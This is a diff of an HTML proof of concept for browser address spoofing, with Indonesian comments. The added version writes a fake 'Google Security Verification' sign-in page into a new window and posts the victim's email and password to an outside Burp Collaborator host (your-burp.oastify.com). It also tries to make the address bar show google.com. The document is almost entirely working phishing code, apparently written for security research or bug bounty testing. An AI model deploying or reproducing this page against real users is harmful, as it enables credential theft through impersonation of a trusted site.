@@ -1,30 +1,44 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <button onclick="spoof()">Click to spoof</button>
+<body>
+  <button onclick="spoof()">Click to spoof</button>
 
-    <script>
-      function spoof() {
-        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
-        let win = window.open("https://www.google.com/csi", "_blank");
-
-        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
-        setTimeout(() => {
-          try {
-            win.document.write(`
-  <h1>This is not Google!</h1>
-<button onclick="
-  let username = prompt('Enter your username');
-  let password = prompt('Enter your password');
-  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">Click me</button>
-            `);
-            win.document.close();
-          } catch (e) {
-            console.warn("Blocked by browser protections:", e);
-          }
-        }, 50);
-      }
-    </script>
-  </body>
+  <script>
+    function spoof() {
+      // Buka about:blank dulu
+      let win = window.open("about:blank", "_blank");
+      
+      // Inject content langsung
+      win.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>Google</title>
+        </head>
+        <body>
+          <h1>Google Security Verification</h1>
+          <form action="https://your-burp.oastify.com" method="POST">
+            <label>Email:</label><br>
+            <input type="text" name="email" required><br><br>
+            <label>Password:</label><br>
+            <input type="password" name="password" required><br><br>
+            <input type="submit" value="Sign In">
+          </form>
+          <script>
+            // Coba manipulasi URL setelah content loaded
+            setTimeout(() => {
+              try {
+                window.history.replaceState({}, "", "https://www.google.com/");
+              } catch(e) {
+                console.log("Cannot change URL");
+              }
+            }, 100);
+          <\/script>
+        </body>
+        </html>
+      `);
+      win.document.close();
+    }
+  </script>
+</body>
 </html>
